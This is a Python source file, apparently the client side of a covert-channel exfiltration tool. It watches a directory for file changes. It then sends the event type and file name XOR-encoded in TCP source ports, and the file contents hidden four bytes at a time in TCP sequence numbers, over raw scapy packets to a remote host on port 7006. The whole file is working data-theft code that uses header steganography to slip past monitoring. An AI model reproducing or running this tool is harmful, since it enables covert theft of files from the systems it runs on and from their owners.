import os
import time
import pickle
import socket
import time
from scapy.all import sniff, IP, TCP
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from config import ENCRYPTION_KEY

raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

def encrypt_chunk(chunk, key):
    encrypted_chunk = bytes([(byte ^ key) % 256 for byte in chunk])
    return encrypted_chunk
    
def encrypt_char(char, key):
    encrypted_char = chr(ord(char) ^ key)
    return encrypted_char

def covert_file(file_path, dest_ip, dest_port):
    num = 0
    with open(file_path, "rb") as file:
        while True:
            chunk = file.read(4)  # Read 1024 bytes at a time
            if not chunk or chunk == '':
                break
            if len(chunk) <= 3:
                chunk = chunk.ljust(4, b'\x00')

            key = sum(ord(char) for char in ENCRYPTION_KEY)
            
            encrypted_chunk = encrypt_chunk(chunk, key)
            # Encode the data into the sequence number with a modulo operation
            secret = int.from_bytes(encrypted_chunk, byteorder='big') % (2**32)  # Modulo operation to keep it within TCP sequence number space

            packet = IP(dst=dest_ip) / TCP(dport=dest_port, seq=secret)
            packet_bytes = bytes(packet)

            raw_socket.sendto(packet_bytes, (dest_ip, 0))
                    

class MyHandler(FileSystemEventHandler):
    def __init__(self, path, addr):
        """_summary_

        Args:
            path (_type_): _description_
            socket (_type_): _description_
        """
        super(MyHandler, self).__init__()
        self.path = path
        self.addr = addr
        self.file_events = []
        self.key = sum(ord(char) for char in ENCRYPTION_KEY)
        self.raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        
    def store_file_event(self, file_path, event_type):
        try:
            # Read file contents and store event and contents as a tuple in the list
            self.file_events.append((event_type, file_path))
        except Exception as e:
            print(f'Error storing file event: {e}')
    
    def on_modified(self, event):
        """_summary_

        Args:
            event (_type_): _description_
        """
        if self.is_within_observed_path(event.src_path):
            if event.is_directory:
                # Handle modified directory
                print(f'Directory {event.src_path} has been modified.')
            else:
                # Handle modified file
                self.store_file_event(event.src_path, 'MODIFIED')
                print(f'File {event.src_path} has been modified.')

    def on_created(self, event):
        """_summary_

        Args:
            event (_type_): _description_
        """
        if self.is_within_observed_path(event.src_path):
            if event.is_directory:
                # Handle newly created directory
                print(f'Directory {event.src_path} has been created.')
            else:
                # Handle newly created file
                self.store_file_event(event.src_path, 'ADDED')
                print(f'File {event.src_path} has been created.')

    def on_deleted(self, event):
        """_summary_

        Args:
            event (_type_): _description_
        """
        if self.is_within_observed_path(event.src_path):
            if event.is_directory:
                # Handle deleted directory
                print(f'Directory {event.src_path} has been deleted.')
            else:
                # Handle deleted file
                self.store_file_event(event.src_path, 'DELETED')
                print(f'File {event.src_path} has been deleted.')
         
    def send_next_file(self):
        """_summary_

        Args:
            file_path (_type_): _description_
            event_type (_type_): _description_
        """
        if self.file_events:
            event_type, file = self.file_events[0]
            file_name = os.path.basename(file)
            
            if event_type != 'DELETED':
                for char in event_type:
                    packet = IP(dst=self.addr) / TCP(sport=ord(encrypt_char(char, self.key)), dport = 7006)
                    self.raw_socket.sendto(bytes(packet), (self.addr, 0))
                    time.sleep(1.25)
                
                packet = IP(dst=self.addr) / TCP(sport=ord(encrypt_char("|", self.key)), dport = 7006)
                self.raw_socket.sendto(bytes(packet), (self.addr, 0))
                time.sleep(1.25)
                
                for char in file_name:
                    packet = IP(dst=self.addr) / TCP(sport=ord(encrypt_char(char, self.key)), dport = 7006)
                    self.raw_socket.sendto(bytes(packet), (self.addr, 0))
                    time.sleep(1)
                    
                packet = IP(dst=self.addr) / TCP(sport=ord(encrypt_char("|", self.key)), dport = 7006)
                self.raw_socket.sendto(bytes(packet), (self.addr, 0))
                time.sleep(1)
                
                full_path = os.path.abspath(file)
                
                time.sleep(1)
                covert_file(full_path, self.addr, 7006)
                time.sleep(0.5)
                packet = IP(dst=self.addr) / TCP(sport=ord(encrypt_char("|", self.key)), dport = 7006)
                self.raw_socket.sendto(bytes(packet), (self.addr, 0))
                time.sleep(1)
                print(f"[{event_type}] The file {file_name} was sent successfully")
                self.file_events.pop(0)
                
            else:
                for char in event_type:
                    packet = IP(dst=self.addr) / TCP(sport=ord(encrypt_char(char, self.key)), dport = 7006)
                    
                    self.raw_socket.sendto(bytes(packet), (self.addr, 0))
                    time.sleep(1.25)
                
                packet = IP(dst=self.addr) / TCP(sport=ord(encrypt_char("|", self.key)), dport = 7006)
                self.raw_socket.sendto(bytes(packet), (self.addr, 0))
                time.sleep(1.25)
                
                for char in file_name:
                    packet = IP(dst=self.addr) / TCP(sport=ord(encrypt_char(char, self.key)), dport = 7006)
                    self.raw_socket.sendto(bytes(packet), (self.addr, 0))
                    time.sleep(1)
                
                packet = IP(dst=self.addr) / TCP(sport=ord(encrypt_char("|", self.key)), dport = 7006)
                self.raw_socket.sendto(bytes(packet), (self.addr, 0))
                time.sleep(1)
                print(f"[{event_type}] The file name {file_name} was sent succesfully")
                self.file_events.pop(0)
            
    def is_within_observed_path(self, event_path):
        """_summary_

        Args:
            event_path (_type_): _description_

        Returns:
            _type_: _description_
        """
        # Check if the event path is within the observed directory or its subdirectories
        return event_path.startswith(self.path)

